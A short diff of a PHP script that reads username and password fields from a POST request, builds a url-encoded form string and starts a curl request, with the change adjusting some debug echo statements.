@@ -2,11 +2,12 @@
 $usern = "usernamevalhere";
 $passw = "passwordvalhere";
 echo $usern;
-echo $passw;
+echo "\n";
 $fields = array(
 	'username' => urlencode($_POST[$usern]),
 	'password' => urlencode($_POST[$passw])
 );
+echo $fields;
 foreach($fields as $key=>$value) { $fields_string .= $key.'='.$value.'&'; }
 rtrim($fields_string, '&');
   $curl_handle=curl_init();
